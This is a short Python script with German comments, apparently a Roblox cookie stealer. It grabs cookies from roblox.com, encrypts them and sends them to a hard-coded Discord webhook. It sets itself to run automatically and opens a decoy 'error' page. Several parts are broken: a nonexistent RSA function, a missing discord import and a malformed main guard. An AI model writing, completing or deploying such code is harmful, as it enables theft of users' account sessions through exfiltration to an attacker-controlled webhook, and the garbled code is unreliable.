import requests
import json
import base64
import rsa
import os
import secrets
import threading

def grab_cookies(url):
    if url == "https://www.roblox.com/home":
        response = requests.get(url)
        cookies = response.cookies

        # Erzeuge ein RSA-Schlüsselpaar
        key = rsa.generate_keys(2048)

        # Verschlüssele die Cookies mit dem privaten Schlüssel
        encrypted_cookies = rsa.encrypt(json.dumps({"cookies": cookies}).encode(), key.privatekey().encode())

        # Sende die verschlüsselten Cookies an den Discord-Bot
        bot = discord.Client()
        bot.run("SIgmnMJ9qx8FKl3ysQ8WhqtYX2wwUXVljjT_m5cdS-oWO-LGvUNENMsqPZj3cVIIzHdJ")

        # Erstelle einen privaten Discord-Webhook
        webhook = discord.Webhook(url="https://discord.com/api/webhooks/1174419954951536661/SIgmnMJ9qx8FKl3ysQ8WhqtYX2wwUXVljjT_m5cdS-oWO-LGvUNENMsqPZj3cVIIzHdJ")

        # Sende die verschlüsselten Cookies an den Webhook
        webhook.send(encrypted_cookies)


def run_on_load():
    # Importiere das Modul mit dem Cookie Grabber
    import cookie_grabber

    # Starte den Cookie Grabber als Hintergrundprozess
    threading.Thread(target=cookie_grabber.grab_cookies, args=("https://www.roblox.com/home",)).start()


if name == "main":
    # Füge den Code zum automatischen Starten des Cookie Grabbers hinzu
    import atexit
    atexit.register(run_on_load)

    # Öffne die Webseite
    os.system("start fehler.html")